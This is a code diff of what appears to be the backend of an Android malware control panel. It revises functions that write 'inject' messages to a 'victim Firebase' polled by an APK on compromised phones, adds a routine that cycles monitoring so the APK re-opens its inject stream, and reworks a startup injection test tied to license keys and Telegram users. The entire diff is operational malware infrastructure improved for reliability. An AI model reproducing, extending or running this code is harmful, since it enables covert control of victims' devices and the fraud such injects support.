@@ -449,7 +449,7 @@ async def push_mynum_inject(
     sender: str,
     body: str,
 ) -> str | None:
-    """Astik-style inject: messages/num-{mynum}/ on victim + module Firebase."""
+    """Astik-style inject: messages/num-{mynum}/ on victim Firebase (APK poll path)."""
     poll_id = resolve_apk_poll_id(profile, device)
     if not poll_id or not profile.phone_number:
         return None
@@ -464,24 +464,53 @@ async def push_mynum_inject(
         "injected": False,
         "created_at": datetime.now(timezone.utc).isoformat(),
     }
-    tasks = []
-    for firebase_url in _inject_firebase_bases(profile, device):
-        base = normalize_firebase_url(firebase_url)
-        tasks.append(_firebase_put_ok(f"{base}/messages/{poll_id}/{message_id}", payload))
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    if any(result is True for result in results):
-        logger.info(
-            "Inject queued poll_id=%s bases=%s",
+    bases = _inject_firebase_bases(profile, device)
+    if not bases:
+        logger.error("Inject push failed: no Firebase URL for device %s", device.name)
+        return None
+
+    victim_base = normalize_firebase_url(bases[0])
+    victim_path = f"{victim_base}/messages/{poll_id}/{message_id}"
+    victim_ok = await _firebase_put_ok(victim_path, payload)
+    if not victim_ok:
+        logger.error(
+            "Inject push failed on victim Firebase poll_id=%s url=%s",
             poll_id,
-            [normalize_firebase_url(url) for url in _inject_firebase_bases(profile, device)],
+            victim_base,
         )
-        return message_id
-    logger.error(
-        "Inject push failed poll_id=%s bases=%s",
-        poll_id,
-        _inject_firebase_bases(profile, device),
-    )
-    return None
+        return None
+
+    extra_tasks = []
+    for firebase_url in bases[1:]:
+        base = normalize_firebase_url(firebase_url)
+        extra_tasks.append(_firebase_put_ok(f"{base}/messages/{poll_id}/{message_id}", payload))
+    if extra_tasks:
+        await asyncio.gather(*extra_tasks, return_exceptions=True)
+
+    logger.info("Inject queued poll_id=%s victim=%s", poll_id, victim_base)
+    return message_id
+
+
+async def nudge_apk_poll_config(profile: MonitorProfile, device: Device | None = None) -> None:
+    """After auto-stop, brief monitoring=false then true so APK re-opens the inject stream."""
+    if not profile.is_monitoring:
+        return
+    license_key = get_license_key(profile)
+    if not license_key or not license_key.upper().startswith("KEY-"):
+        return
+
+    saved = profile.is_monitoring
+    try:
+        profile.is_monitoring = False
+        await push_virtus_apk_config(profile, device)
+        await push_module_config(profile, device)
+        await asyncio.sleep(0.35)
+        profile.is_monitoring = saved
+        await push_virtus_apk_config(profile, device)
+        await push_module_config(profile, device)
+        await asyncio.sleep(0.25)
+    finally:
+        profile.is_monitoring = saved
 
 
 async def push_outbound_to_firebase(
@@ -557,8 +586,11 @@ async def send_polling_startup_test(
         poll_id = mynum_device_id(profile.phone_number)
         register_device_on_key(license_key, poll_id, profile.telegram_user_id)
 
+    poll_id = resolve_apk_poll_id(profile, device)
+    await nudge_apk_poll_config(profile, device)
     await push_virtus_apk_config(profile, device)
     await push_module_config(profile, device)
+    await asyncio.sleep(0.3)
 
     t0 = time.perf_counter()
     try:
@@ -571,7 +603,12 @@ async def send_polling_startup_test(
         if not message_id:
             raise RuntimeError("startup inject push failed")
         total_ms = max(1, int((time.perf_counter() - t0) * 1000))
-        logger.info("Startup Astik inject queued for /mynum id=%s", message_id)
+        logger.info(
+            "Startup inject queued poll_id=%s firebase=%s id=%s",
+            poll_id,
+            resolve_apk_firebase_url(profile, device),
+            message_id,
+        )
         return 1, total_ms
     except Exception as exc:
         logger.warning("Startup test inject failed: %s", exc)
